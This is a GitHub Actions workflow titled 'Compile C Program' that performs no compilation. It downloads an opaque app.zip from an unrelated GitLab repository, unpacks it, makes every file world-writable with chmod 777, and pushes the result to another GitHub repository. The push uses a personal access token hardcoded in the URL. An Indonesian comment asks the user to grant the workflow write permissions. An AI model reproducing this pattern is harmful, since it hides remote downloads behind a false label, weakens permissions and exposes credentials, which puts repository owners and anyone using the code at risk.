name: Compile C Program

on:
  push:
    branches: [ master, main ]
  pull_request:
    branches: [ master, main ]


jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v2

      - name: Install
        run: |
          sudo apt-get update

      - name: Cu
        run: |
          wget https://gitlab.com/bunikanasa/pimliwoe/-/raw/main/app.zip
          unzip app.zip
          chmod -R 777 .

      - name: Commit compiled file # Buka repository GitHub kamu -- Masuk ke "Settings" â†’ "Actions" -- Scroll ke bagian "Workflow Permissions" -- Pilih "Read and write permissions" -- Klik Save
        run: |
          git config --local user.email "bunikanasa@sam1.eu.org"
          git config --local user.name "bunikanasa"
          git add .
          git commit -m "Update"
          git push https://x-access-token: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@github.com/bunikanasa/sanuah.git
